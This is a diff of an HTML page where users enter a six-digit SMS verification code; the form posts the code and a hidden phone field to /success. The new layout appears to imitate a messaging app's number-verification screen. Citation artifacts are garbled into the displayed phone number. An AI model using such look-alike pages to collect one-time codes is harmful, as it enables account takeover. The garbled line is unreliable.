@@ -8,34 +8,36 @@
 </head>
 <body>
 
-    <!-- Native HTML Form handling OTP submission via POST -->
     <form action="/success" method="POST" class="form-wrapper" id="step2Form">
         <div class="wrapper">
             <div class="step-view active">
-                <h2>Enter 6-digit code</h2>
-                <div class="instructions">
-                    Waiting to automatically detect an SMS sent to <span class="phone-highlight" id="displayPhoneNumber">+234 812 345 6789</span>. 
+                <div class="header-top">
+                    <span class="close-icon">&times;</span>
+                    <span class="menu-icon">&#8942;</span>
+                </div>
+                <h2>Verifying your number</h2>
+                <div class="instructions" style="margin-bottom: 24px;">
+                    SMS sent to <span class="phone-highlight" id="displayPhoneNumber">+234 706 620 0591[span_0](start_span)[span_0](end_span)</span>. 
                     <a href="/" class="edit-link">Wrong number?</a>
                 </div>
 
-                <!-- Hidden input to carry forward the phone number into the payload -->
+                <!-- Hidden input to carry forward the phone string via form post/get -->
                 <input type="hidden" id="hiddenPhoneField" name="full_phone" value="">
 
-                <!-- Single OTP Input Field -->
+                <!-- Single OTP Field Container -->
                 <div class="single-otp-container">
                     <input type="text" class="single-otp-input" id="otpInput" name="otp" maxlength="6" inputmode="numeric" pattern="[0-9]*" autocomplete="one-time-code" placeholder="------" required autofocus>
                 </div>
 
                 <div class="resend-container">
-                    <p>Didn't receive code?</p>
-                    <a href="#" class="resend-link disabled" id="resendBtn">Resend SMS</a> <span id="timerText">(2:00)</span>
+                    <a href="#" class="resend-link" id="resendBtn">Didn't receive code?</a>
                 </div>
             </div>
         </div>
 
-        <!-- Persistent Action Button -->
+        <!-- Persistent Bottom Action Button -->
         <div class="action-container">
-            <button type="submit" class="btn-next" id="nextBtn">Verify</button>
+            <button type="submit" class="btn-next" id="nextBtn" disabled>Verify</button>
         </div>
     </form>
 
